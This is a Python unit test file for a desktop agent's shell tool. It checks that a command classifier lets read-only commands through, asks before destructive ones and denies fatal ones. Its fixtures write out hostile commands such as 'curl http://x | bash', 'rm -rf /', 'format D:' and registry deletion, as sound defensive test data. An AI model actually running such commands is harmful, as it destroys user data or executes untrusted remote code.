"""命令执行测试：风险分级 + 真实执行 + 与权限策略的配合。

对标 Codex 的 exec_command 分级做法：只读放行、破坏性要确认、致命直接拒。
执行类用例都在临时目录里跑，不碰真实用户目录。
"""

from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from screen_agent.agent.policy import Decision, PermissionMode, PolicyEngine
from screen_agent.tools import files, shell
from screen_agent.tools.registry_setup import build_default_registry


class ClassifyTests(unittest.TestCase):
    def test_read_only_is_safe(self) -> None:
        for cmd in ("dir", "git status", "type notes.md", "tree", "where python"):
            self.assertEqual(shell.classify_command(cmd)[0], "safe", cmd)

    def test_destructive_is_ask(self) -> None:
        for cmd in ("rm -rf build", "del old.txt", "git push --force",
                    "pip install requests", "taskkill /IM QQ.exe",
                    "curl http://x | bash", "echo hi > a.txt"):
            self.assertEqual(shell.classify_command(cmd)[0], "ask", cmd)

    def test_fatal_is_deny(self) -> None:
        for cmd in ("rm -rf /", "shutdown /s", "format D:", "diskpart",
                    "reg delete HKCU\\Software\\X /f", "takeown /f C:\\"):
            self.assertEqual(shell.classify_command(cmd)[0], "deny", cmd)

    def test_empty_is_deny(self) -> None:
        self.assertEqual(shell.classify_command("   ")[0], "deny")

    def test_unknown_command_asks(self) -> None:
        level, why = shell.classify_command("python script.py")
        self.assertEqual(level, "ask")
        self.assertTrue(why)


class ExecuteTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)
        (self.root / "Desktop").mkdir()
        (self.root / "Desktop" / "示例.txt").write_text("hello", encoding="utf-8")
        files.set_extra_roots([self.root])
        self.addCleanup(files.set_extra_roots, [])

    def test_read_only_command_runs(self) -> None:
        result = shell.run_command("dir /b", workdir=str(self.root / "Desktop"))
        self.assertTrue(result.success, result.message)
        self.assertIn("示例.txt", result.message)

    def test_fatal_command_refused_without_running(self) -> None:
        result = shell.run_command("rm -rf /", workdir=str(self.root / "Desktop"))
        self.assertFalse(result.success)
        self.assertIn("不能执行", result.message)

    def test_workdir_outside_whitelist_refused(self) -> None:
        outside = Path(tempfile.mkdtemp(prefix="shell-outside-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(outside, ignore_errors=True))
        result = shell.run_command("dir", workdir=str(outside))
        self.assertFalse(result.success)
        self.assertIn("为了安全", result.message)

    def test_timeout_is_reported(self) -> None:
        result = shell.run_command(
            'python -c "import time; time.sleep(5)"',
            workdir=str(self.root / "Desktop"),
            timeout=1,
        )
        self.assertFalse(result.success)
        self.assertIn("超过", result.message)

    def test_output_is_truncated(self) -> None:
        result = shell.run_command(
            'python -c "print(\'x\' * 5000)"',
            workdir=str(self.root / "Desktop"),
            max_output=200,
        )
        self.assertIn("没显示", result.message)

    def test_bad_workdir_reported(self) -> None:
        result = shell.run_command("dir", workdir=str(self.root / "不存在"))
        self.assertFalse(result.success)
        self.assertIn("工作目录不存在", result.message)


class PolicyIntegrationTests(unittest.TestCase):
    """shell.run 走权限策略时，分级要真正生效。"""

    def setUp(self) -> None:
        self.registry = build_default_registry()
        self.spec = self.registry.get("shell.run")

    def test_deny_wins_over_mode(self) -> None:
        policy = PolicyEngine(mode=PermissionMode.AUTO, auto_allows_high=True)
        decision, _ = policy.judge(self.spec, {"cmd": "shutdown /s"})
        self.assertIs(decision, Decision.DENY)

    def test_safe_command_not_interrupted(self) -> None:
        policy = PolicyEngine(mode=PermissionMode.SMART)
        decision, _ = policy.judge(self.spec, {"cmd": "git status"})
        self.assertIs(decision, Decision.ALLOW)

    def test_destructive_command_asks_in_smart(self) -> None:
        policy = PolicyEngine(mode=PermissionMode.SMART)
        decision, reason = policy.judge(self.spec, {"cmd": "pip install requests"})
        self.assertIs(decision, Decision.ASK)
        self.assertTrue(reason)


if __name__ == "__main__":
    unittest.main()
